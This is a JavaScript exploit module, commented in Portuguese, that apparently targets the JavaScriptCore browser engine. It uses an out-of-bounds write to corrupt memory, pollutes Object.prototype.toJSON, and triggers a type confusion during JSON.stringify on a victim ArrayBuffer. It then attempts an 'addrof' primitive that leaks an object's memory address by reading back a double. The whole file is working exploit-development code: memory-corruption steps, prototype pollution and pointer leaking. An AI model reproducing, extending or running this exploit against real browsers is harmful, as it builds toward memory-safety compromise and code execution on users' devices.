// js/script3/testArrayBufferVictimCrash.mjs (Modificado para tentativa de addrof DIRETA com ajuste de índice)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Importado mas não usado diretamente aqui, triggerOOB gerencia
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Nome do módulo atualizado para refletir a tentativa de addrof
export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v2_IndexAdjust"; // Mudança no nome para v2

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64; // Deve ser suficiente para float64_view_on_victim[0] e para this[2]

// Variáveis globais do script original
let toJSON_call_details_v28 = null;

// NOVA LÓGICA PARA ADDROF: Objeto cujo endereço queremos vazar.
let object_to_leak_for_addrof_attempt = null;


// toJSON Ultra-Minimalista, AGORA COM A TENTATIVA DE ESCRITA PARA ADDROF NO ÍNDICE CORRIGIDO
function toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2() { // Nome da sonda atualizado
    toJSON_call_details_v28 = {
        probe_variant: "V28_Probe_With_Addrof_Idx2", // Nome da sonda atualizado
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        probe_called: false
    };

    try {
        toJSON_call_details_v28.probe_called = true;
        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
        logS3(`[${toJSON_call_details_v28.probe_variant}] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "leak");

        // MODIFICADO PARA ADDROF: Se a Heisenbug ocorrer...
        if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
            logS3(`[${toJSON_call_details_v28.probe_variant}] HEISENBUG CONFIRMADA! Tentando escrever object_to_leak_for_addrof_attempt em this[2]...`, "vuln");
            if (object_to_leak_for_addrof_attempt) {
                this[2] = object_to_leak_for_addrof_attempt; // <<<< MUDANÇA CRUCIAL AQUI: this[0] para this[2]
                logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de referência em this[2] (supostamente) realizada.`, "info");
            } else {
                logS3(`[${toJSON_call_details_v28.probe_variant}] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
            }
        } else if (this === victim_ab_ref_for_original_test) {
            logS3(`[${toJSON_call_details_v28.probe_variant}] Heisenbug NÃO confirmada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "warn");
        }

    } catch (e) {
        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${toJSON_call_details_v28.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
    }
    return { minimal_probe_executed: true }; // Retorno original
}

// Variável para manter a referência ao victim_ab para a sonda
let victim_ab_ref_for_original_test = null;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug Estável e Tentativa de Addrof com Índice Ajustado ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    toJSON_call_details_v28 = null;
    victim_ab_ref_for_original_test = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObjectForAddrof" };

    let errorCapturedMain = null;
    let stringifyOutput = null;
    
    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu."
    };
    
    const corruptionTargetOffsetInOOBAB = 0x7C; // Mesmo offset de antes

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') { // Checagem mais robusta
             throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`    Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); 

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
        const fillPattern = 0.123456789101112; // Padrão de preenchimento
        float64_view_on_victim.fill(fillPattern);

        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2, // Usar a sonda ATUALIZADA
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2.name}.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escrita para addrof em this[2])`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
            
            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]") {
                logS3(`  HEISENBUG CONFIRMADA (fora da sonda, via toJSON_call_details_v28)! Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                
                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug e tentativa de escrita (em this[2]) na sonda...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_on_victim[0]; // AINDA LEMOS DE [0] DA VIEW
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

                const double_buffer_for_conversion = new ArrayBuffer(8);
                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
                double_view_for_conversion[0] = value_read_as_double;
                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

                // A mesma lógica de verificação de ponteiro
                if (value_read_as_double !== 0 && value_read_as_double !== fillPattern &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "Heisenbug confirmada E leitura de double (de this[2]) sugere um ponteiro.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "Heisenbug confirmada, mas valor lido de float64_view_on_victim[0] (esperado de this[2]) não parece ponteiro ou buffer não foi alterado.";
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
                }
            } else {
                let msg = "Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28.";
                if(toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON) msg += ` Tipo obs: ${toJSON_call_details_v28.this_type_in_toJSON}`;
                else if (!toJSON_call_details_v28) msg += " toJSON_call_details_v28 é null.";
                addrof_result.message = msg;
                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment(); // Limpar o ambiente OOB ao final do teste
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: toJSON_call_details_v28,
        addrof_attempt_result: addrof_result 
    };
}
